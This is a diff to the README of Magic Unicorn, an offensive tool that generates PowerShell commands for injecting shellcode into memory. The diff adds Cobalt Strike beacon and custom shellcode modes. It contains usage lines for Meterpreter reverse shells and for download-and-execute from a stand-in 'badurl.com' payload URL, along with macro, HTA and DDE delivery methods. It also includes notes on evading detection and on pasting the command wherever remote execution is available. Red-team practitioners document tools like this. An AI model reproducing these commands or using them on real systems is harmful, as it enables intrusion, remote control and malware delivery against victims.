@@ -6,7 +6,7 @@ Website: https://www.trustedsec.com
 
 Magic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.
 
-Usage is simple, just run Magic Unicorn (ensure Metasploit is installed and in the right path) and magic unicorn will automatically generate a powershell command that you need to simply cut and paste the powershell code into a command line window or through a payload delivery system.
+Usage is simple, just run Magic Unicorn (ensure Metasploit is installed if using Metasploit methods and in the right path) and magic unicorn will automatically generate a powershell command that you need to simply cut and paste the powershell code into a command line window or through a payload delivery system. Unicorn supports your own shellcode, cobalt strike, and Metasploit.
 ```
 root@rel1k:~/Desktop# python unicorn.py 
 
@@ -66,11 +66,17 @@ Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt
 PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
 PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
 Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
+Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro
+Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro
 HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
+HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta
+HTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta
 DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
 CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
 Custom PS1 Example: python unicorn.py <path to ps1 file>
 Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
+Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)
+Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)
 Help Menu: python unicorn.py --help
 ```
 
@@ -181,3 +187,80 @@ which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-co
 we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL
 as it has some great methods for not calling DDE at all.
 
+###                -----Import Cobalt Strike Beacon----
+
+This method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.
+
+Within Cobalt Strike, export the Cobalt Strike "CS" (C#) export and save it to a file. For example, call 
+the file, cobalt_strike_file.cs. 
+
+The export code will look something like this:
+
+* length: 836 bytes */
+byte[] buf = new byte[836] { 0xfc, etc
+
+Next, for usage:
+
+python unicorn.py cobalt_strike_file.cs cs
+
+The cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.
+
+Next simply copy the powershell command to something you have the ability for remote command execution.
+
+NOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.
+
+There are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte
+size. That means that from a command line argument perspective if you copy and paste you will hit the
+8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe
+this is an issue, however if you are launching directly from PowerShell or other normal applications
+this is a non-problem.
+
+A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING;
+
+For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no
+issues.
+
+###                 -----Custom Shellcode Generation Method----
+
+This method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code
+will increase the stack side of the powershell.exe (through VirtualAlloc) and inject it into memory.
+
+Note that in order for this to work, your txt file that you point Unicorn to must be formatted in the 
+following format or it will not work:
+
+0x00,0x00,0x00 and so on.
+
+Also note that there is size restrictions. The total length size of the PowerShell command cannot exceed
+the size of 8191. This is the max command line argument size limit in Windows.
+
+Usage:
+
+python uniocrn.py shellcode_formatted_properly.txt shellcode
+
+Next simply copy the powershell command to something you have the ability for remote command execution.
+
+NOTE: THE FILE MUST PROPERLY BE FORMATTED IN A 0x00,0x00,0x00 TYPE FORMAT WITH NOTHING ELSE OTHER THAN
+YOUR SHELLCODE IN THE TXT FILE.
+
+There are some caveats with this attack. Note that if your payload size is large in nature it will not
+fit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will 
+hit the 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from 
+cmd.exe this is an issue, however if you are launching directly from PowerShell or other normal 
+applications this is a non-problem.
+
+A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING;
+
+For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  
+issues.
